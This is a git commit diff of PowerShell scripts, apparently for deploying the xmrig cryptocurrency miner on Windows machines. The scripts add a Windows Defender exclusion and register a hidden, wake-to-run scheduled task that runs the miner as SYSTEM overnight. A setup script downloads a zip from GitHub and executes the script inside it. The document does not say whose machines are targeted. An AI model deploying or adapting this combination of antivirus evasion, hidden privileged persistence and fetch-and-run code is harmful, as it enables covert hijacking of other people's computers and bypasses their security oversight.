32bad968db9f1b0ed55fd60426fd63190d093f6d
NativeIT <68449281+nativeit@users.noreply.github.com>
2021-08-24 04:54:54 -0400

    update

--- nightlyrun.ps1
+++ nightlyrun.ps1
@@ -7,19 +7,22 @@ $ProgramExe = $ProgramDir + '\xmrig.exe'
 # Add exception to Windows Defender
 Add-MpPreference -ExclusionPath $homedir
 
+$settings = New-ScheduledTaskSettingsSet -Hidden -WakeToRun -ExecutionTimeLimit 07:55:00 -Priority 0
+$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
 # Setup schedule to start xmrig daily at 11pm
 
-$action = New-ScheduledTaskAction -Execute $ProgramExe -Argument '-NoProfile -WindowStyle Hidden'
+$action = New-ScheduledTaskAction -Execute $ProgramExe
 
 $trigger = New-ScheduledTaskTrigger -Daily -At 11pm
 
-Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -TaskName "Start xmrig" -Description "Start xmrig"
+Register-ScheduledTask StartNightly -Action $action -Settings $settings -Principal $principal -Trigger $trigger -Description "Start xmrig"
 
 
 # Setup schedule to stop xmrig daily at 7am
 
-$stopAction = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "taskkill /im xmrig.exe /f"'
+$stopAction = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-command "taskkill /im xmrig.exe /f"'
 
 $stopTrigger =  New-ScheduledTaskTrigger -Daily -At 7am
 
-Register-ScheduledTask -Action $stopAction -Trigger $stopTrigger -RunLevel Highest -TaskName "Stop xmrig" -Description "Stop xmrig"
+Register-ScheduledTask StopNightly -Action $stopAction -Trigger $stopTrigger -Principal $principal -Description "Stop xmrig"
---
+++ setup.ps1
@@ -0,0 +1,9 @@
+﻿$working = "C:\Support\nightly"
+
+mkdir $working
+Invoke-WebRequest -Uri "https://github.com/nativeit/mine/archive/refs/heads/main.zip" -OutFile 'C:\Support\nightly\main.zip'
+
+$mainzip = "C:\Support\nightly\main.zip"
+
+Expand-Archive $mainzip -DestinationPath $working -Force
+& "C:\Support\nightly\mine-main\init.ps1"
